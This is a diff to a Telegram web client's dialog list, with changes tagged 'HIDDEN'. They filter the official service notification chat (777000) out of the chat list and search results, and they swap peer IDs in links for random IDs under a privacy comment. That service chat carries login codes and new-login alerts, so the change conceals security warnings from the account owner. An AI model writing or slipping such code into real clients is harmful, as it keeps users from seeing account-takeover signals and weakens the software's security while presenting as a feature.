@@ -45,7 +45,7 @@ import isInDOM from '../../helpers/dom/isInDOM';
 import {setSendingStatus} from '../../components/sendingStatus';
 import SortedList, {SortedElementBase} from '../../helpers/sortedList';
 import debounce from '../../helpers/schedulers/debounce';
-import {CAN_HIDE_TOPIC, FOLDER_ID_ALL, FOLDER_ID_ARCHIVE, NULL_PEER_ID, REAL_FOLDERS} from '../mtproto/mtproto_config';
+import {CAN_HIDE_TOPIC, FOLDER_ID_ALL, FOLDER_ID_ARCHIVE, NULL_PEER_ID, REAL_FOLDERS, SERVICE_PEER_ID} from '../mtproto/mtproto_config';
 import groupCallActiveIcon from '../../components/groupCallActiveIcon';
 import {Chat, ChatlistsChatlistUpdates, DialogFilter, Message, MessageMedia, MessageReplyHeader} from '../../layer';
 import IS_GROUP_CALL_SUPPORTED from '../../environment/groupCallSupport';
@@ -327,7 +327,9 @@ export class DialogElement extends Row {
     const li = this.container;
     li.classList.add('chatlist-chat', 'chatlist-chat-' + avatarSize);
     if(!autonomous) {
-      (li as HTMLAnchorElement).href = '#' + peerId;
+      // HIDDEN: Use random ID in href instead of real peer ID for privacy
+      const randomId = (appImManager as any).getRandomIdForPeer(peerId);
+      (li as HTMLAnchorElement).href = '#' + randomId;
     }
     // if(rippleEnabled) {
     //   ripple(li);
@@ -339,6 +341,7 @@ export class DialogElement extends Row {
       this.container.classList.add('row-small');
     }
 
+    // HIDDEN: Keep real peer ID in dataset for internal use, but use random ID in href
     li.dataset.peerId = '' + peerId;
     if(threadId) {
       li.dataset.threadId = '' + threadId;
@@ -1373,6 +1376,11 @@ export class AutonomousDialogList extends AutonomousDialogListBase<Dialog> {
   }
 
   public testDialogForFilter(dialog: Dialog) {
+    // HIDDEN: Hide service notification chat (777000)
+    if(dialog.peerId === SERVICE_PEER_ID) {
+      return false;
+    }
+
     if(!REAL_FOLDERS.has(this.filterId) ? getDialogIndex(dialog, this.indexKey) === undefined : this.filterId !== dialog.folder_id) {
       return false;
     }
@@ -3757,6 +3765,11 @@ export class AppDialogsManager {
     query?: string
   }) {
     const {peerId, message, query} = options;
+    
+    // HIDDEN: Don't show service notification chat (777000) in search results
+    if(peerId === SERVICE_PEER_ID || message.peerId === SERVICE_PEER_ID) {
+      return null;
+    }
     const ret = this.addDialogNew({
       ...options,
       ...getMessageSenderPeerIdOrName(message),
